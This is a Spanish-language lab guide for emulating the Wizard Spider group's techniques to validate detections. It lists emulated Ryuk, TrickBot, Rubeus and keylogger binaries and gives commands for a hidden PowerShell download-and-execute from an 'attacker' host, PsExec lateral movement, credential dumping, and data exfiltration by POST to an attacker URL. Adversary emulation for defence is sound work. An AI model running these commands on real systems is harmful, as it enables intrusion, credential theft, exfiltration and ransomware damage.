
# 📘 Fase 3: Emulación de Técnicas - Wizard Spider

Esta fase consiste en ejecutar técnicas específicas asociadas al adversario Wizard Spider, utilizando binarios conocidos en un entorno controlado para validar detecciones y comportamientos del sistema.

---

## 📁 Recursos

La carpeta `Resources/` del plan de emulación contiene los componentes necesarios para ejecutar técnicas relacionadas con el grupo APT Wizard Spider.

### 🔸 Contenido de la carpeta

- **Código fuente de software emulado**: 
  Algunos binarios están acompañados de su código fuente para fines educativos o de análisis.

- **Archivos ejecutables (binaries)**:
  Se encuentran empaquetados en archivos `.zip` protegidos por contraseña. Estos ejecutables simulan herramientas maliciosas reales utilizadas por Wizard Spider (e.g., Ryuk, TrickBot, Rubeus).

- **Archivo comprimido `Binaries.zip`**:
  Incluye todos los ejecutables de forma centralizada para facilitar su descarga y uso.

### 🔐 Contraseña de los archivos ZIP

La contraseña para todos los archivos `.zip` protegidos es:

```
malware
```

> ⚠️ Esto es una práctica común en la distribución de muestras maliciosas con fines de análisis, para evitar activaciones accidentales por antivirus o escaneos automáticos.

### 🧰 Script para descifrado automático

Se proporciona un script en Python para automatizar el proceso de descifrado de los ejecutables comprimidos.

#### ▶️ Uso del script:

```bash
$ cd wizard_spider
$ python3 Resources/utilities/crypt_executables.py -i ./ -p malware --decrypt
```

- `-i ./` : Directorio de entrada con los archivos ZIP.
- `-p malware` : Contraseña usada para descifrar.
- `--decrypt` : Ejecuta el proceso de desencriptado.

#### ✅ Resultado Esperado

Tras la ejecución del script, se obtiene acceso a los ejecutables listos para su uso durante la Fase 3 (Emulación de Técnicas).

---

## 🧪 Entorno de laboratorio

- Host: VirtualBox
- Máquinas virtuales:
  - Kali Linux (Attacker)
  - Windows 10 (ws1, ws2)
  - Windows Server 2019 (dc01)
- Red: Aislada o en modo interno (sin conexión a Internet)
- Herramientas activas:
  - Sysmon
  - Wireshark
  - Procmon
  - Event Viewer

---

## ⚙️ Paso 1: Emulación de PowerShell y servicios

### Objetivo:
Ejecutar comandos PowerShell utilizados por Wizard Spider para persistencia o ejecución remota.

```powershell
# Ejemplo: ejecución de payload desde memoria
powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')"
```

---

## 🚪 Paso 2: Movimiento lateral con SMB/PsExec

### Objetivo:
Usar `PsExec` o equivalentes para moverse lateralmente entre máquinas.

```cmd
psexec.exe \10.0.0.8 -u Administrator -p Password cmd.exe
```

---

## 🔐 Paso 3: Credential Dumping con herramientas específicas

### Objetivo:
Extraer credenciales del sistema.

```cmd
# Rubeus - Kerberos credential extraction
rubeus.exe dump

# Dump de credenciales del navegador
dumpWebBrowserCreds.exe
```

---

## 📡 Paso 4: Comunicación con C2 y transferencia de archivos

### Objetivo:
Simular comunicación con Command & Control y transferencia de archivos.

```cmd
# Ejecutar Exaramel client
Exaramel-Windows.exe

# Utilizar TrickBot client simulado
TrickBotClientExe.exe
```

---

## 📤 Paso 5: Exfiltración de datos

### Objetivo:
Comprimir y enviar datos simulados a un servidor externo.

```powershell
Compress-Archive -Path C:\Users\Public\data -DestinationPath data.zip
Invoke-WebRequest -Uri http://attacker/upload -Method POST -InFile data.zip
```

---

## 💥 Paso 6: Impacto (Ransomware - Ryuk)

### Objetivo:
Simular un ataque de cifrado de archivos.

```cmd
# Ejecutar Ryuk simulado (solo en entorno controlado)
ryuk.exe
```

---

## 🛠️ Binarios utilizados

| Binario                         | Técnica Emulada                         |
|--------------------------------|-----------------------------------------|
| adfind.exe                     | Discovery (T1018)                        |
| dumpWebBrowserCreds.exe        | Credential Dumping (T1555)              |
| Exaramel-Windows.exe           | C2 Channel (T1071)                       |
| Exaramel-Windows-Dropper.exe   | Initial Access/Persistence (T1059)       |
| generate-files.exe             | Data Staging (T1074)                     |
| inject.x64.exe                 | Code Injection (T1055)                   |
| keylogger.exe                  | Input Capture (T1056.001)                |
| rubeus.exe                     | Credential Dumping (T1003)              |
| ryuk.exe / RyukTests.exe       | Impact (T1486)                           |
| TrickBotClientExe.exe          | Recon + Credential Access (T1056, T1082)|
| uxtheme.exe                    | Masquerading (T1036)                     |

---

## 📊 Recolección de Logs

- **Sysmon** para registro de procesos y red
- **Event Viewer** para eventos críticos
- **Wireshark** para tráfico de red
- **Procmon** para seguimiento de actividades en el sistema

---

## ✅ Resultado Esperado

- Validación de detección de TTPs en el entorno.
- Captura de evidencia para análisis forense.
- Documentación de alertas generadas por sistemas defensivos.

> ⚠️ **Nota:** Esta emulación no debe realizarse en entornos productivos. Asegúrate de estar en un entorno completamente aislado.
